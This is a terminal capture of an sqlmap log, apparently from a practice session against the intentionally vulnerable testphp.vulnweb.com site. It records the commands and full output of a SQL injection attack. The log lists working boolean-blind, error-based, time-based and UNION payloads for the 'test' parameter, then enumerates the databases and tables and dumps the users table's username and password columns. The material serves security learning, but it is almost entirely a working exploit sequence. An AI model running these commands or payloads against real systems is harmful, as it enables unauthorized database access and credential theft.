ra117698@pc-da-xuxa:~$ cat ~/.local/share/sqlmap/output/testphp.vulnweb.com/log

COMANDO sqlmap -u http://testphp.vulnweb.com/search.php?test= --dbs

sqlmap identified the following injection point(s) with a total of 566 HTTP(s) requests:
---
Parameter: test (GET)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: test=' AND EXTRACTVALUE(9737,CASE WHEN (9737=9737) THEN 9737 ELSE 0x3A END)-- CXDx

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: test=' AND GTID_SUBSET(CONCAT(0x7176707671,(SELECT (ELT(1950=1950,1))),0x71767a7071),1950)-- hyxo

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: test=' AND (SELECT 9196 FROM (SELECT(SLEEP(5)))jPqY)-- qjLG

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: test=' UNION ALL SELECT 6231,CONCAT(0x7176707671,0x4e59486b554e66704272734770524a56764e4d436d425a526a684a59704f74444370676e464e426b,0x71767a7071),6231#
---
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
available databases [2]:
[*] acuart
[*] information_schema



COMANDO: sqlmap -u http://testphp.vulnweb.com/search.php?test= -D acuart --tables

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: test (GET)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: test=' AND EXTRACTVALUE(9737,CASE WHEN (9737=9737) THEN 9737 ELSE 0x3A END)-- CXDx

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: test=' AND GTID_SUBSET(CONCAT(0x7176707671,(SELECT (ELT(1950=1950,1))),0x71767a7071),1950)-- hyxo

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: test=' AND (SELECT 9196 FROM (SELECT(SLEEP(5)))jPqY)-- qjLG

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: test=' UNION ALL SELECT 6231,CONCAT(0x7176707671,0x4e59486b554e66704272734770524a56764e4d436d425a526a684a59704f74444370676e464e426b,0x71767a7071),6231#
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

COMANDO sqlmap -u http://testphp.vulnweb.com/search.php?test= -D acuart -T users -C "uname,pass" --dump

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: test (GET)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: test=' AND EXTRACTVALUE(9737,CASE WHEN (9737=9737) THEN 9737 ELSE 0x3A END)-- CXDx

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: test=' AND GTID_SUBSET(CONCAT(0x7176707671,(SELECT (ELT(1950=1950,1))),0x71767a7071),1950)-- hyxo

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: test=' AND (SELECT 9196 FROM (SELECT(SLEEP(5)))jPqY)-- qjLG

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: test=' UNION ALL SELECT 6231,CONCAT(0x7176707671,0x4e59486b554e66704272734770524a56764e4d436d425a526a684a59704f74444370676e464e426b,0x71767a7071),6231#
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
Database: acuart
Table: users
[1 entry]
+-------+------+
| uname | pass |
+-------+------+
| test  | test |
+-------+------+